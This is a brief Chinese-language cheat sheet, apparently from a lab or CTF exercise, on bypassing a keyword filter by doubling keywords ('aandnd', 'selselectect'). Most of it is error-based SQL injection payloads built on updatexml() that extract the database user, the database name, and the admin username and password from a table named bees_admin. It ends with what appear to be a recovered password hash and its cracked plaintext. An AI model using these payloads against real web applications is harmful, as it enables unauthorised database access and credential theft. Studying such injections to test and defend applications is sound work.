# 报错绕过

双写绕过，`and` 写成 `aandnd`，中间 `and` 被替换后，是一个正确的 `and`，或者 `a and nd`

查找当前用户

```sql
admin' a and nd updatexml(1,concat('~',user()), 1)--+
```

查找数据库名

```sql
admin' a and nd updatexml(1,concat('~',database()), 1)--+
```

查找用户名

```sql
admin' a and nd updatexml(1,concat('~',*(selselectect admin_name fr from om bees_admin)), 1)--+
```


查找密码

```sql
admin' a and nd updatexml(1,concat('~',(selselectect admin_password fr from om bees_admin)), 1)--+
-- 长度超过错误输出最大内容

admin' a and nd updatexml(1,concat('~',(selselectect substr(admin_password,0) fr from om bees_admin)), 1)--+
```

ae3700364f2111b2cea75d8e19d2331e

aabbccdd@123